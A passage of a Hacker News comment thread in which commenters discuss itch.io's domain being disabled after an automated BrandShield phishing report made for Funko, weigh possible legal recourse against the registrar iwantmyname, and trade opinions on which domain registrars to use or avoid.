but the domain registrar must choose between every domain they have and one that is causing trouble. reply Suppafly 19 minutes agoparentprevI wish brandshield would pull this shit with someone that was large enough to sue them for fraud or tortious interference. reply safety1st 6 hours agoparentprevSo it sounds like this was DMCA abuse by Funko, aided and abetted by BrandShield, and it resulted in damages to you. Also sounds like iwantmyname just went along with it, they are probably conditioned to do so by the rules. I would write up a complaint and send it to the incoming FTC Commissioner. Yes, I'm serious. From the signals Trump is sending if there is ever a time when Republicans may support some form of DMCA reform, it's now. He's on record talking about punishing Big Tech and supporting \"Little Tech.\" You're Little Tech. Send copies of your letter to Funko and BrandShield. Also reach out or at least send a copy to Matt Stoller, the guy who publishes a very popular newsletter about monopoly, anti-trust and corporate abuse in America, he will be interested. Go for the throat. reply Mindwipe 4 hours agorootparentGiven the OP and admin in the comments explicitly say that this wasn't a DMCA claim it would rather hurt any campaign to lie and say it was. reply tremon 4 hours agorootparentBut the DMCA is the only legal mechanism for demanding swift action from a registrar/hosting party without the involvement of a judge, at least FAFAIK. So if this wasn't a DMCA takedown, then the registrar was acting completely of their own volition and should be liable for all fallout. reply qingcharles 2 hours agorootparentNo, sadly it's not. These are private companies.. if you write to them and tell them to take a site down for \"reasons\" and they think the \"reasons\" are good enough, they'll do it. reply jaromiru 9 hours agoparentprevHey, perhaps you can mediate the impact by providing an alternate way to access the site (IP, alternative domain) and posting it somewhere people will see it (bsky, here, ...)? Realistically , this may take days to resolve. reply andrewmcwatters 2 hours agoparentprevYou really need to get off both .io and this no-name registrar. reply antihero 10 hours agoparentprevCan you transfer the domain out? reply leafo 10 hours agorootparentUnfortunately the domain has a hold placed on it by the registrar, so I believe transferring is disabled. I also wouldn't want to risk doing a transfer at an hour when their staff aren't available to help with the current issue. reply derefr 1 hour agoparentprev> The BrandShield software is probably instructed to eradicate all \"unauthorized\" use of their trademark, so they sent reports independently to our host and registrar claiming there was \"fraud and phishing\" going on, likely to cause escalation instead of doing the expected DMCA/cease-and-desist. Because of this, I honestly think they're the malicious actor in all of this. I feel like there's also some missing layer of infrastructure here. itch.io, like a lot of sites (HN being another), is meant to act as a host of user-generated content, over which the site takes a curatorial but not editorial stance. (I.e. the site has a Terms of Use; and has moderators that take things down / prevent things from being posted according to the Terms of Use; but otherwise is not favoring content according to the platform's own beliefs in the way that e.g. a newspaper would. None of the UGC posted \"represents the views\" of the platform, and there's no UGC that the platform would be particularly sad to see taken down.) I feel like, for such arms-length-hosted UGC platforms, there should be a mechanism to indicate to these \"brand protection\" services (and phishing/fraud-detection services, etc) that takedown reports should be directed first-and-foremost at the platform itself. A mechanism to assert \"this site doesn't have a vested interest in the content it hosts, and so is perfectly willing to comply with takedown requests pointed at specific content; so please don't try to take down the site itself.\" There are UGC-hosting websites that brand-protection services already treat this way (e.g. YouTube, Facebook, etc) — but that's just institutional \"human common sense\" knowledge held about a few specific sites. I feel like this could be generalized, with a rule these takedown systems can follow, where if there's some indication (in a /.well-known/ entry, for example) that the site is a UGC-host and accepts its own platform-level abuse/takedown reports, then that should be attempted first, before trying to get the site itself taken down. (Of course, such a rule necessarily cannot be a full short-circuit for the regular host-level takedown logic such systems follow; otherwise pirates, fraudsters, etc would just pretend their one-off phishing domains are UGC platforms. But you could have e.g. a default heuristic that if the takedown system discovers a platform-automated-takedown-request channel, then it'll try that channel and give it an hour to take effect before moving onto the host-level strategy; and if it can be detected from e.g. certificate transparency logs that the current ownership of the host is sufficiently long-lived, then additional leeway could be given, upgrading to a 24-72hr wait before host-takedown triggers.) reply JosefAlbers 4 hours agoparentprevIt's working again now. reply seanthemon 10 hours agoparentprevman, this shit is ridiculous.. now we can't even make fan pages? Will you be moving away from this registrar? It seems like it could very easily be abused again. reply jeroenhd 10 hours agorootparentSome companies have always been terrible about this. Fan projects involving companies like Nintendo or Take Two Interactive (GTA) are like lawyer bait. Disney has hired lawyers to sue a daycare center that had (clearly unofficial) character art painted on the walls. It's dystopic, but it's the world we live in. I didn't really expect Funko or 10:10 Games to be like that, but then again I didn't expect anyone would like Funko enough to make a fan page about their dolls. Other companies allow fans to do pretty much whatever you want with their IP as long as you don't turn it into (too much of) a business. Sega has even hired a fan for their remasters rather than DMCA his project into oblivion. When companies do this, I interpret this as the company giving a clear message: \"don't be a fan of our work or we may apply legal pressure\". reply willis936 5 hours agorootparentIt's just so surprisingly tone deaf when things like this are done by companies that exist purely within the goodwill of their customers. Nothing that funko brings to the table has inherent value. If they have any world outlook other than to love their customers as much as they can, then they will fail in a time measured in quarters. reply jeroenhd 3 hours agorootparentI'm pretty sure Funko used their service in good faith and didn't know it's based on over-aggressive AI bullshit. They're still on the hook for picking a bad company to partner with, but I don't think they intended to take down the entire domain. reply Rotundo 5 minutes agorootparentI don't see a large message on the Funko site with a profuse apology for taking down Itchio. This indicates to me they fully endorse their action and are not willing to make amends. CM30 7 hours agorootparentprevJust gonna point out that the Nintendo going after fanworks bit is a tad blown out of proportion, especially online. They're definitely known for being way too heavy handed (especially compared to the likes of Sega), but they're not exactly going after every fan project they see on the internet. Large sites whose entire purpose is to host fan games and mods for the Mario, Zelda, Pokemon, etc series have been up for decades without any issues, and most mods and homebrew projects for consoles older than the Wii U or Switch are going fine. Unless a project is going viral in the media, raking up in a significant amount of money via a paywall or is directly competing with a current game, the chances of it getting shut down are incredibly low. reply multimoon 6 hours agorootparentNintendo just finished killing both major switch emulators. reply mrguyorama 43 minutes agorootparentNintendo also is responsible for keeping Dolphin off of Steam. Dolphin wanted to get on steam for improved steam deck integration and Valve reached out to Nintendo who said, essentially : Lol fuck no we will ruin your life The courts have told Nintendo numerous times that they are in the wrong in this behavior and outlook. They have no legal means to keep Dolphin off Steam and it is a matter of judicial record that emulators are not an infringement of your IP on their own. Nintendo doesn't care and openly discusses their intent to make you suffer through lawfare. A just system would smack them down with a vexatious litigant label, but our system gives businesses infinite benefit of the doubt. reply gcr 5 hours agorootparentprevNot true. Nintendo is notoriously litigious in the fan games community. reply oneeyedpigeon 10 hours agorootparentprevAfter this, everyone will be moving away from this registrar... reply npteljes 9 hours agorootparentYou'd think, or hope, but GoDaddy and other actors proved over the years that this is not the case. I think that the kind of site most impacted by an event like this are social sites, where if people leave, they might take their networks with them. But a normal b2c service provider just needs to update their PR and prices and business will be back to usual. reply PostOnce 10 hours agorootparentprevNot only that, I'm moving a domain to a local registrar so I can get legal redress here if I need to. Not from iwantmyname, never heard of them, but of course now that I have, I couldn't do business with them in light of the situation. reply TiredOfLife 6 hours agorootparentprevAnd itch.io who removed that page. reply crtasm 4 hours agorootparent>a fan page for an existing Funko Pop video game (Funko Fusion), with links to the official site and screenshots of the game. I'd expect them to remove that, they're not a host for fan pages. reply Hamuko 10 hours agorootparentprevFan anything has always been at the mercy of the trademark owner. reply seanthemon 10 hours agorootparentthere was a time where the internet wasn't a corpo hellscape. reply johnnyanmac 8 hours agorootparentThis kind of impersonation/defamation is one of the edge cases where its good to have a DMCA process. You want to quickly take down something like this and then deal with the slow legal stuff over time. reply Kye 7 hours agorootparentThey have a DMCA process. As far as I know it only helps in a case like this if they sue Funko or the brand management service. Itch is a small indie operation funded by actual commerce, so might not be able to afford it. reply throw_m239339 9 hours agorootparentprev> there was a time where the internet wasn't a corpo hellscape. DMCA passed in 1998. it was short lived. reply johnisgood 8 hours agorootparentNot that short-lived in practice, because it may have been passed but it was not enforced to oblivion like it is now. reply pessimizer 2 hours agoparentprevI'm pretty sure that the Funko Pop → Funko Fusion → brandshield.com → BrandShield automated software → DMCA → iwantmyname.com (Team Internet) → itch.io path means that it's no one's fault and no one's to blame, and there's no one to appeal to other than the media. Wonderful how we've constructed our society like this. reply lxgr 1 hour agorootparent> it's no one's fault and no one's to blame There's obviously somebody to blame. Somebody getting a legitimate domain taken down for hours should have consequences, if only to make mistakes more expensive for trigger-happy automated \"IP protection\" services (the only signal they'll probably understand). The question is just if itch.io has the funding and energy to actually pursue the matter legally, now that it's technically resolved. I couldn't blame them for just changing registrars instead. reply mort96 9 hours agoparentprevThat's extremely disappointing from iwantmyname. While I haven't used it, it was always on my mind as a potential registrar when buying a domain. I think I'll have to reconsider. reply drusepth 59 minutes agoprevWe actually had almost the exact same thing happen to Notebook.ai last month: - automated notice of trademark infringement from some posted user content, accusing us of \"fraud and phishing\" (filed by a third party on behalf of Meta) - that user content was immediately deleted upon receiving the notice - exactly a week later, our host (Heroku) banned our account with a generic no-reason \"Your account has been banned.\" Total downtime of about 24 hours until it was resolved; luckily, Heroku's support simply unbanned the account whenever I reached out to ask why we were banned. Migrating to another host wouldn't have taken much longer, but would have been a pain. Goes to show layering a couple automated processes together can have pretty devastating false-positives. I'm glad there was a human in the loop at Heroku I could reach to get things sorted out relatively quickly; also glad to see Itch.io is back up and got it sorted out relatively quickly as well. reply KingOfCoders 11 hours agoprev\"Phishing report to our registrar, iwantmyname, who ignored our response and just disabled the domain\" One registrar off the list of registrars you wanna use. reply jamil7 10 hours agoparentThey used to be really good, independent registrar from New Zealand but I think got acquired sometime a few years ago and went down hill. reply BrandiATMuhkuh 10 hours agorootparentYes that's true. Just yesterday I bought a new domain through them. I'm surprised about their slowness. Again, 2 days ago I sent a request via their web-form and less than 24h later it was resolved. Disclosure: I know the founder (Lenz). reply MortyWaves 9 hours agorootparentIs Lenz happy with how he operates his company? reply willvarfar 9 hours agorootparentThe GP says they were acquired a few years ago. So the question should be if Lenz is happy with how those who brought his company are now running it? Of course that is not the kind of question that a founder should ever answer candidly on the internet :) reply BrandiATMuhkuh 7 hours agorootparentCorrect. The company was sold many years ago. So I have no idea if he is happy reply jomar 9 hours agorootparentprevAs noted above, what used to be a cool little Wellington-based company got bought by some offshore conglomerate. Lenz himself left about five years ago. reply conradfr 9 hours agorootparentprevThe same thing happened to Gandi. reply Algent 9 hours agorootparentIt's crazy how downhill Gandi went in 2 years. Went from decently priced French registar to basically asking for 70€ a year for a mailbox and lately asked me for over 40€ to renew a dot dev domain. I ended up transferring all my domains due to this. reply officialchicken 9 hours agorootparentprevGandi went sour when the original French company was forced to open a separate company for the US several years before being sold. IIRC it was related EU privacy but they publicly stated it was about credit card processing. reply KingOfCoders 9 hours agorootparentDidn't know, could you explain how a French company is forced to open a US company because of EU privacy laws? reply em-bee 9 hours agorootparentprevinteresting, do you have a link to more details on why the split company was needed and how it affected using them? reply sureglymop 10 hours agoprevA similar thing has happened to me before. There is a company with the same name as my surname with a trademark for it. When I registered a domain with my surname in it, the registrar had an automatic process in place that checked for this trademark and took away access of the domain. So far so good. The problem was that the registrar and its support then ghosted me and also never refunded me for the money already paid to lease the domain for a year. Overall it was a bad experienced with bad communication that made me switch registrar (note: this was a different registrar than mentioned here). I think one of the problems is that as more and more individual consumers buy domains, certain legal processes and automation are not ready for that. A good registrar should anticipate that an individual private consumer may not have the legal experience or knowledge to deal with just being hit with something they were never explicitly warned of. reply lolinder 4 hours agoparent> When I registered a domain with my surname in it, the registrar had an automatic process in place that checked for this trademark and took away access of the domain. So far so good. I don't think this is good. Trademarks are country-specific, not global like domains. Further, within a country trademarks are only valid within the scope of certain classes, which means: * There will often be more than one trademark holder of even non-surname trademarks. * You can't trademark a surname to prevent its use generally, you can only restrict its use in a narrow sphere. I understand why domain registrars automatically overenforce their country's trademark laws (they can't deal with the legal complications that will result from them not doing so), but it's very much not good that someone like you can get to a domain for your surname first and be told you can't have it in case the trademark holder (for which class???) might want it. reply lxgr 1 hour agorootparent> Trademarks are country-specific, not global like domains. Domains are also subject to local law! For ccTLDs, it's usually that of the country in question; for gTLD, to my knowledge the US has effective jurisdiction (through ICANN) over at least some of the popular gTLDs such as .com and .net. \"Local law\" in this case doesn't just include actual laws on the books, but also the risk and cost of getting sued by either a trademark holder or a non-trademark-infringing domain owner. This is exactly the type of issue that people usually don't consider when picking a TLD, vanity or otherwise. reply hobofan 7 hours agoparentprev> I think one of the problems is that as more and more individual consumers buy domains Huh, I was always under the assumption that the percentage of domains bought by individual consumers is shrinking. As in, in the early days of the internet until ~2010 where commercialization was only slowly picking up (or only concentrated to a few domains), the majority of domains were personal websites and blogs. reply ivanmontillam 5 hours agorootparent> Huh, I was always under the assumption that the percentage of domains bought by individual consumers is shrinking. Yes, but a segment of the domain market still buys their name domains and defends them on the Internet. I bought my fname+lname domain a few years ago, but I'm not planning to surrender it to a random conglomerate. > As in, in the early days of the internet until ~2010 where commercialization was only slowly picking up (or only concentrated to a few domains), the majority of domains were personal websites and blogs. A deep part of me hopes this part of the market never dies, for the good health of the Internet's sovereignity. reply djsnoopy 5 hours agorootparentprevThe percentage share of personal domains doesn’t tell you everything. More and more consumers probably are buying personal domains just by the nature of it getting cheaper and easier to host and there being more people on the internet year over year. Could be proven wrong though because I don’t know how to get the numbers. reply will5421 7 hours agoparentprevWhich registrar was this? I’d like to avoid them. reply Modified3019 7 hours agorootparent“iwantmyname”, from leafo’s post here: https://news.ycombinator.com/item?id=42364033 reply lxgr 1 hour agorootparentI find it curious that this (purely factual and correct) comment got downvoted/flagged into oblivion. reply roryokane 1 hour agorootparentHow would you know whether Modified3019’s comment is factual and correct? sureglymop wrote “note: this was a different registrar than mentioned here”, and they haven’t written any other comments in the thread that might identify the registrar. reply lxgr 41 minutes agorootparent> How would you know whether Modified3019’s comment is factual and correct? By following the reference they provided, which is to a post by the person running itch.io stating just that. I don't know if the linked comment is actually correct, but the link to a comment plus quoteof the relevant part seems as factual as it gets. reply moralestapia 7 hours agoparentprevTrademarks are country specific while domain names are not. Would be interesting to know what happens if they took this to trial (in which country though). reply lxgr 1 hour agorootparentOf course domain registrations are also subject to national law. .io in particular is (currently) under UK jurisdiction. reply rf15 11 hours agoprevBrand Shield and other AI slopware needs to be sued to death for all the damage they cause, including their customer's reputation and bottom line reply paxys 8 hours agoparentEven if the suit is 100% justified (which it is in this case), and you can show damages, the problem will usually be of jurisdiction. Funko Pop is an American Company. BrandShield, the \"Brand Protection Software\" they used, is based out of Israel. iwantmyname, the registrar, is from New Zealand. They got bought out by Team Internet, which is British. And who knows where all of them are actually registered. They are all going to point the finger at each other for the problem. Who do you sue, and where? reply latexr 4 hours agorootparentThe chain of culpability, in my view as an outsider, goes iwantmyname > BrandShield > Funko Pop. Funko Pop hired BrandShield, but from what I understand they did so exactly because the latter does all the work without you having to intervene. Kind of like you hiring a lawyer and them using ChatGPT to present the case, full of errors and non-existent sources. The lawyer might have been acting on your behalf, but they didn’t really do so according to your intentions and their fuck up isn’t your fault. On first view I’d say BrandShield is a culprit here, but can’t be so sure about Funko Pop yet. On the other hand, iwantmyname is absolutely at fault. They took down a client’s website without asking or recourse, then sat on their asses. That’s who you sue, because they’re the ones who ultimately had the power and made the decision that affected itch.io. If iwantmyname wants to sue BrandShield and/or Funk Pop or whatever else in turn, none of your concern. The one’s who hurt the business were iwantmyname by not doing due diligence or contacting the client but just automatically bending over. Now if they should be sued in Britain or New Zealand, that’s for the lawyers to know. In fact, all of this is for the lawyers to figure out. I’m not one. I’m merely expressing what makes logical sense to me, which could be incredibly wrong. reply Etherlord87 7 hours agorootparentprevYou sue the registrar, because you have the contract with the registrar. reply toast0 1 hour agorootparentYou also sue the others, because they interfered with your contract with the registrar. reply kvdveer 10 hours agoparentprevOf course the problem is that legally speaking, they don't cause any damage - service providers they target cause the damage. BS have no true authority over these service providers, just the threat of some legal claim. The service providers comply voluntarily as they don't want to spend time checking if the claim is valid. reply PostOnce 10 hours agorootparentI don't think this is the kind of advice a good lawyer would give. BrandShield, Funko, and iwantmyname all caused serious financial harm through, at a minimum, tortious negligence. I'm not a lawyer, but even a yokel like me knows there's more to this legally than a shrug and \"the software did it\". reply jcranmer 4 hours agorootparentIANAL either, but my guess is that itch.io has precisely 0 plausible legal recourse here. The strongest case would be something along the lines of breach of contract via the domain registrar, but your standard internet contract has a term in it that amounts to \"we get the right to fuck you\", so I assume that applies here, so no breach of contract actually exists. This also kills every claim that's dependent on breach of contract, so tortious interference is also dead. Fraud will fail because itch.io itself isn't being defrauded at the very least. Business disparagement, and anything else along the lines of defamation, is going to fail because you need something like actual malice--specific knowledge of falsity--there, and that's essentially impossible to prove, not without somebody admitting that they knew all along everything was false. Tortious interference is dead for several reasons. First, you need an underlying tort, which, as detailed above, probably doesn't exist. Next, you need specific knowledge of the contract being broken. Finally, you need intentionality here: it's not \"I did something that caused the contract to be broken\", it's \"I did something to cause the contract to be broken.\" Outside of somebody jumping up and down shouting \"I'm tortiously interfering with your contracts,\" it's basically impossible to prove tortious interference. reply amyjess 1 hour agorootparent> you need something like actual malice--specific knowledge of falsity IANAL, but as I understand it the definition of malice also includes \"reckless disregard for the truth\". I'm sure a good lawyer can argue that not having human lawyers review, investigate, and confirm computer-generated abuse reports before sending them to outsiders constitutes a reckless disregard for the truth. reply jcranmer 1 minute agorootparentA lawyer might argue that, but it's not going to be a compelling argument. Recklessness is generally a conscious disregard of the consequences; as applied to defamation-like claims, it's generally seen as \"you specifically voiced doubts about the truth\". Failing to vet automated abuse reports is going to be at best negligence (and I'm dubious of even that, because given the nonbinding nature of abuse reports, it's not clear there is even a duty to candor in abuse reports that one can be negligent of), absent internal complaints about \"the accuracy of these things is total shit\". RichEO 9 hours agorootparentprevIt’s clear that you’re not a lawyer, because if you were you’d know that there’s no established duty of care between BrandShield and web masters. reply klez 8 hours agorootparentClearly I'm not a lawyer either, but isn't accusing someone of doing something that is not true and that can have legal ramification a suable behavior in the US? reply pera 7 hours agorootparentAccording to this no one has ever been prosecuted just for sending false DMCA takedown notices: https://law.stackexchange.com/questions/51541/has-anyone-bee... They do mention a case where the defendant acted in bad faith and was found liable for damages though. reply pdpi 7 hours agorootparentIt's a good thing it's not a DMCA takedown notice, then. They reported itch.io for phishing. reply pera 5 hours agorootparentSorry you are right, somehow I'd missed that part reply pdpi 7 hours agorootparentprevSounds like a pretty straightforward case of tortious interference, actually. reply rsynnott 9 hours agorootparentprevEh, dunno about that. They made what would appear to be a false complaint; hard to really consider what was going on here ‘fraud and phishing’! That the magic robot perhaps did it for them matters not at all, in terms of whose fault it is, though a proliferation of magic robots does make junk services like this more of a problem, in that they can flood the internet with nonsense more effectively. reply raxxorraxor 5 hours agoparentprevYes, but also you need to bring your legislators to heel. It is entirely their fault. That you have grifters like brandshield is a symptom. Although you should never employ their lawyers for anything either of course. Make the taint stick to them. reply Jdfmiller 6 hours agoprevI sent a request to the registrar, and they emailed with this response. They're claiming it wasn't their fault. -------- Your request has been updated. To add additional comments, reply to this email. 9 Dec 2024, 10:57 UTC Hello and thank you for your message. The domain name was already reinstated earlier today after the registrant finally responded to our notice and took appropriate action to resolve the issue reply KerrAvon 48 minutes agoparentThe registrant is itch.io. Sounds like victim blaming. reply bpye 11 hours agoprevThe registrar in question is iwantmyname, so I guess you can add them to your \"do not use\" list. reply paxys 11 hours agoparentI feel like it's better to have a \"do use\" list for something as important as a domain name registrar. - Namecheap - Cloudflare - Route 53 (if on AWS) Any others? reply koito17 10 hours agorootparentPersonally use Porkbun since Namecheap's API is poorly-documented and they attempted a KYC audit for purchasing a $100 domain. I am fine with the identity verification, but their ticketing system seems to have sent all of my e-mail to their spam box, because they would never respond. I attempted opening tickets explaining the e-mail situation, but they wouldn't listen. In the end, I gave up and let them deactivate the account. Moved to Porkbun, purchased the exact same domain (no KYC required!), and have been a happy user of their API for about two years now. They also have much more lax requirements for API usage compared to Namecheap. Porkbun also supports WebAuthn and logging in with a security key. It's overall a much nicer service than Namecheap. reply yorer 10 hours agorootparentThat kyc thingy is icann requirement, its how domain registration works. Icann require every accredited registrar to verify registrant details so registrar would randomly ask for id, passport etc. That include porkbun, they're bound to their contract with icann as an accredited registrar too. They probably won't ask today but maybe tomorrow, or next week, or next month, or next year, or never. reply eps 10 hours agorootparentOther registrars just send an annual email asking to verify your contact details. Done. Icaan satisified. No need to actually harass your clients. reply yorer 9 hours agorootparentThey already got your details from your card details and decide its enough. Something like vpn, using niche browser, details on card not tally with registration details etc etc would throw off their threat mitigation system. Also different business operated differently, their payment gateway behave differently etc etc. Too many random factor to avoid xxx specific registrar because they ask for kyc when the kyc itself is a requirement. reply egorfine 8 hours agorootparentprev> That kyc thingy is icann requirement Is it really? Or just contact info is enough? reply rdl 6 hours agorootparentThe requirement in the contract is nowhere near that specific. Contact info validation is sufficient for almost all registrars. It's possible a given registry has higher standards, or maybe one registrar got some order to be more thorough, but great reason to avoid given this is a commodity and there are actually good alternatives. (I broadly like Tucows and Cloudflare) Namecheap is on my NO NO NO list, along with GoDaddy (and a bunch of others). Google Domains was also on this OH GOD NO list, but thankfully Google did the Google thing and killed the product. reply aviraldg 4 hours agorootparentWhat's the problem with Namecheap (I have my domains there right now)? reply egorfine 6 hours agorootparentprevMost of my domains are on Namecheap since the times when wikipedia's domains were there. Hopefully, my low-key personal domains are of no interest to anyone... reply antihero 10 hours agorootparentprevDo porkbun have a terraform provider? E: https://registry.terraform.io/providers/cullenmcdermott/pork... Not sure if it works though reply adhamsalama 10 hours agorootparentprevI bought a domain on Namecheap instead of Porkbun for the exact same reason! reply soulofmischief 9 hours agorootparentprevNamecheap is terrible and cannot be trusted, you can google tons of horror stories. Without a doubt, Porkbun is one of the best. Their staff is knowledgeable, helpful and efficient. Highly recommend them. reply kallistisoft 10 hours agorootparentprevI've been using IONOS (formerly 1und1) for the last 20 years for all of my DNS and hosting needs and couldn't be happier. Their uptime, non-obtrusive policies, and customer support have all been top notch. Can't recommend enough. As an example; I had a dedicated server that I was leasing that I wanted to upgrade, the sales tech noticed that the plan I was currently on had been retired/replaced and credited my account with difference of what I had payed vs the new payment tier which amounted to six months of billing on the upgraded server. You can't really put a price on that kind of honesty! reply MortyWaves 9 hours agorootparentTheir extremely weird and annoying adverts in the UK have ensured I will never use any of their services. reply sli 9 hours agorootparentBack when I was using them, their ToS disallowed a whole lot of perfectly benign content, like pictures of celebrities. If you had a blog about movies and posted a picture of an actor, your account would get deactivated and your data simply deleted. I wouldn't ever trust them for anything I care about. reply supermatt 9 hours agorootparentprevI read this as you having to contact them in order for them to credit you for overcharging you for a retired product when the replacement equivalent was priced lower. Why didn't they proactively inform you that your service was retired and there was an alternative available? It sounds like this must have been going on for a while to be worth 6 months of service in difference alone. I left 1and1 close on 2 decades ago. If you consider this a story of good service, then I would suggest you try some other provider. reply terminalbraid 6 hours agorootparentprevIONOS requires you to make a phone call to talk to their retention reps before you can cancel anything reply antifa 46 minutes agorootparentprev1and1 would call my house trying to sell me shit. reply kuon 7 hours agorootparentprevI use infomaniak from switzerland. Mainly because I can physically go to their office and discuss in person if there is a problem. reply cachedthing0 4 hours agorootparentI used infomaniak once, I'm sure you spended quite some time at their office. reply latexr 4 hours agorootparentprevI’ve been using Hover since they advertised on 5by5 a decade and a half ago, and never had a single issue. They never bother me nor do I need to remember they exist. I only hear from them when they need ICANN contact confirmation or to remind me a domain is expiring. reply xoa 6 hours agorootparentpreveasyDNS still seems good for those who want a more old style \"full fat\" registrar like gandi was? I know some folks I respect who have long used it alongside Route 53. Though they don't appear to support hardware tokens which is a major black mark in my book in 2024. As well as Gandi, DNSimple was another higher service one I really liked that went crazy on pricing. Agreed the registrar scene nowadays seems like a quite small \"do use\" list vs a couple of \"don't use\" :(. reply mech422 3 hours agorootparentI've been using easyDNS for 5(10?) years... Never had a problem with them and highly recommend them. I do 'hobby stuff' - nothing fancy, but it always just works. One time I called to ask if they support wildcard sub-domains (www..example.com or whatever..example.com) and actually had a real engineer pick up the phone :-) (btw - it did work, very well actually :-) ) The backup mail spool is nice too... all in all - not the cheapest - but worth the piece of mind in my book :-D reply JimDabell 10 hours agorootparentprevNamecheap is definitely on my “never use under any circumstances” list for reasons I outlined in this comment: https://news.ycombinator.com/item?id=18091287 The full thread is worth reading for more feedback on a range of registrars, particularly Namecheap: https://news.ycombinator.com/item?id=18086522 I strongly encourage people to only recommend domain registrars if they have verified that customer support won’t completely fuck you over when something goes wrong. Recommending registrars when you’ve only experienced the happy path is doing a disservice to the people you are trying to help out. reply forgotpwd16 9 hours agorootparentNamecheap gave me a quick response and help when requested support regarding a DNSSEC issue. So not everyone has bad customer experience when they needing it. reply doublerabbit 7 hours agorootparentprevI use namecheap too. Apart from their UI being, huh, I've had no problems. reply bpye 11 hours agorootparentprevPorkbun seem popular, I do use them for a couple domains. I haven't heard of anything egregious. reply spiffotron 11 hours agorootparentI use porkbun for all my domains, I’ve never had any issues and they don’t seem to gouge you on price for the smallest things. reply Luker88 9 hours agorootparentprevAny recommendations for people looking for a strictly European registrar? reply conradfr 9 hours agorootparentInfomaniak Netim reply bondant 6 hours agorootparentI'm also looking to move my domains out of gandi but stay with a european registrar. Did someone try netim customers' service? They say on their \"about us\" webpage that the company is still owned by the founders, so I would think the enshittification hasn't started yet. But if some have experiences to share it would be nice. reply conradfr 2 hours agorootparentI went to Infomaniak when moving from Gandi because at the time I found the text contrast too light on Netim ahah, seems better now. But they seemed quite proactive on Twitter around the time people left Gandi en masse. reply teitoklien 10 hours agorootparentprevRoute 53 is outrageously expensive for domains, one should only use it, if they need AWS’s DNS product. reply nucleardog 4 hours agorootparentFor .com as of Aug 2024, Verisign says they charge $10.26 wholesale, and ICAANN charges $0.18/domain for a total of $10.46/yr wholesale. Route53's .com is $14/yr. So the three year price is $42. Three year prices from a few registrars (there's so many pricing games the \"per year\" price is nonsense in most cases): Cloudflare: $31.32 (-0.06) GoDaddy: $46.93 (+15.55) Namecheap: $41.24 (+9.86) Namesilo: $51.87 (+20.49) Porkbun: $29.61 (-1.77) Route53: $42 (+10.46) Spaceship: $28.98 (-2.40) All diffs given against the $31.38/3yr wholesale price from Verisign+ICAAN. Not sure how that qualifies as \"outrageously expensive\". You can make your own trade-offs, but for something that's literally the foundation of my online identity, business, etc I'm willing to pay $3.50/yr over wholesale for a company with a reputation, support, and generally aligned incentives. You may choose to instead tie your online identity and business to someone charging less than cost to save half the price of a big mac a year. But I will find it hard to dig up much sympathy when we all find out _how_ they're planning to make money doing that. reply pfoof 6 hours agorootparentprevYou can use any registrar with R53, so it's more like: if you really need to have domain registration written in Terraform and the other registrar doesn't provide it reply thequux 5 hours agorootparentprevI've used Register4Less for over a decade and I've been thrilled with them. They're slightly more expensive than the cheapest options (by a buck or two), but this is more than made up for by the fact that they're the only registrar I've ever used who have proactively reached out about minor issues. Every time I've needed to email them, I've gotten a response from somebody who can fix the problem within minutes. reply astrange 9 hours agorootparentprevHover is fine. Never had a domain shut down though. I have one on dynadot because Hover doesn't support the TLD, and the website sure is a lot more awkward. reply freedomben 1 hour agorootparentAnother happy Hover user. Been using them many years. Not the cheapest, but a reasonable markup and works well, and hasn't shown signs of enshittification. Knock on wood. reply orphea 7 hours agorootparentprevNamecheap is on my personal \"never use; fuck them\" list. I moved my domains to Cloudflare, and I am happy since then. Porkbun is great. reply pfoof 6 hours agorootparentprevI use Namecheap and sadly still Gandi for old domains. The only issue I experience with Namecheap are included redirects which have something like 90% uptime. Route53 domains is seriously not needed for anything - just add zone in AWS and point your registrar to new NS. reply weberer 5 hours agorootparent>Route53 domains is seriously not needed for anything If you're already hosting on AWS, then you'd only have one potentially hostile company to deal with instead of 2. reply itscrush 4 hours agorootparentprevNamecheap's been out a while, I'd drop them from your list too. Porkbun's in for now. reply norman784 10 hours agorootparentprevCan you elaborate on Cloudflare? I currently have some domains there (moved a few years ago from Godaddy), so is there something I need to worry about? reply beAbU 10 hours agorootparentCloudflare is on the GP's \"do use\" list, not the \"do not use\" list. I think the HN consensus is that Cloudflare is a reasonably safe bet. reply jsheard 9 hours agorootparentThough keep in mind that domains registered through CF must use CFs nameservers, you can't point them elsewhere if you need to. They sell domains at cost so of course they want to keep you in their ecosystem so you might pay for something else. reply beAbU 7 hours agorootparentThat's true. I have my domains on Namecheap and my DNS on CF. I think it's just that little bit of extra safety to spread the risk a little. reply framapotari 10 hours agorootparentprevThis is a \"do use\" list, so recommended services. reply KingOfCoders 11 hours agorootparentprevNamecheap has horrendous billing UI with their products, also not PDF so makes it hard for freelancers when you have many domains and your accounts want an PDF. Easiest is a registrar that mails you invoices in PDF. reply teitoklien 10 hours agorootparenttheir billing works just fine, i pay with it all the time. They support credit/debit cards, bitcoin, and Paypal. I went with Namecheap especially because of their seamless payment method, Used to struggle at times paying for my domains with Gandi, etc. Namecheap payment system works just fine. reply KingOfCoders 10 hours agorootparentMe: \"Namecheap has horrendous billing UI\" You: \"their billing works just fine\" [then talking about payments, when I wasn't talking about payments but billing, \"The process of sending an invoice (a bill) to customers for goods or services\" -Wikipedia] They have their billing for domains and products spread over several pages, there is not one place in the UI where they have all payments/billing combined, they don't have PDFs as I've stated and they don't sent invoices by email. Their billing UI is horrendous. reply TurtleStacker 10 hours agorootparentprevINWX reply zeeZ 7 hours agorootparentI'm very happy with INWX, but their API is a bit lacking when it comes to limiting the potential blast radius. It's either full access to everything or, thanks to their support for creating a special account on request, only full access to DNS management. reply cybrox 10 hours agorootparentprevBeen with INWX for >10y, never had an issue. reply sebmellen 10 hours agorootparentprevINWX is really great and they also support just about every TLD. reply f33d5173 3 hours agorootparentprevThe upper two have had several known issues with them. I haven't heard anything about the latter one, but that doesn't mean they're free of issues. reply midasz 11 hours agorootparentprevI'm with Namecheap and they're decent but one big minus is how inaccessible their API is, would put them on the bottom of the \"do use\" list. reply spariev 8 hours agorootparentprevI use pananames.com, they for sure won't do things like OP described reply bb010g 6 hours agorootparentprevI've had great experiences with NameSilo. reply smitelli 6 hours agorootparentAnother happy customer of NameSilo here. A handful of .com, .net, and a .org domain registered with them, and I've never been personally irritated by anything they've done. reply poincaredisk 10 hours agorootparentprevOVH is pretty good reply nicoloren 9 hours agorootparentYes, never add a problem here (in France). reply gcr 5 hours agorootparentprevNamesilo? reply Ylpertnodi 9 hours agorootparentprevI'd prefer a 'do not' list, because 'experience quoted'. Any one of the names you mention could be bought/ new CEO etc 